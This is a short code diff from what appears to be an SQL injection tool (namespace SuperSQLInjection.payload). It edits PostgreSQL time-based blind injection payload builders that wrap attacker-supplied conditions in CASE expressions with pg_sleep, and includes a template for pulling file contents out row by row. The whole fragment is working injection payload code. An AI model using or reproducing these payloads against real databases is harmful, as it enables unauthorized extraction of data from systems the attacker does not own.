@@ -104,18 +104,15 @@ namespace SuperSQLInjection.payload
         public static String file_content_data = "(select data from ssqlinjection offset {index} limit 1)";
 
 
-
         public static String getBoolDataBySleep(String data,int maxTime)
         {
-            return " 1=(case when ((" + data + ")>{len}) then (select 1 from pg_sleep(" + maxTime + ")) else 1 end)";
+            return " (case when ((" + data + ")>{len}) then (select false from pg_sleep(" + maxTime + ")) else false end)";
         }
 
         public static String getBoolCountBySleep(String data, int maxTime)
         {
-            return " 1=(case when ((" + data + ")) then (select 1 from pg_sleep(" + maxTime + ")) else 1 end)";
+            return " (case when ((" + data + ")) then (select false from pg_sleep(" + maxTime + ")) else false end)";
         }
-
-        
 
 
         /// <summary>
